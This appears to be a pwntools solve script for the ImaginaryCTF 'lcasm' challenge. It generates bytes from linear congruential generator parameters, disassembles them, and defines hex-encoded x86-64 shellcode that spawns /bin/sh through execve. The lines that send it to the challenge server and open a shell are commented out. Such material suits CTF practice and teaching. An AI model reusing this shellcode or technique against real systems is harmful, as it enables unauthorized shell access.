from pwn import *
import capstone
# nc lcasm.chal.imaginaryctf.org 1337
# r = remote('lcasm.chal.imaginaryctf.org', 1337)
r = process(['./lcasm'])
# r = gdb.debug(['./lcasm'], 'b main')

s = '0x97d31f9a65ff160d 0x2e2420eb89aceb7a 0x89c42245afacc465 0x77fbdc1e6759710d'
mod, a, c, x = [int(i, 16) for i in s.split()]

out = b''

for i in range(16):
    x = (a * x + c) % mod
    out += x.to_bytes(8, 'little')

print(out.hex())

cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
for i in cs.disasm(out, 0):
    print(f'{i.mnemonic} {i.op_str}')

payload2 = bytes.fromhex('488d3d0900000031c099b03b31f60f052f62696e2f73680090909090909090909090909090909090909090909090909090909090909090909090909090909090ebbe')

# r.sendlineafter(b'x> ', str(x).encode())
# r.sendlineafter(b'a> ', str(a).encode())
# r.sendlineafter(b'c> ', str(c).encode())
# r.sendlineafter(b'm> ', str(mod).encode())

# r.sendline(payload2)

# r.interactive()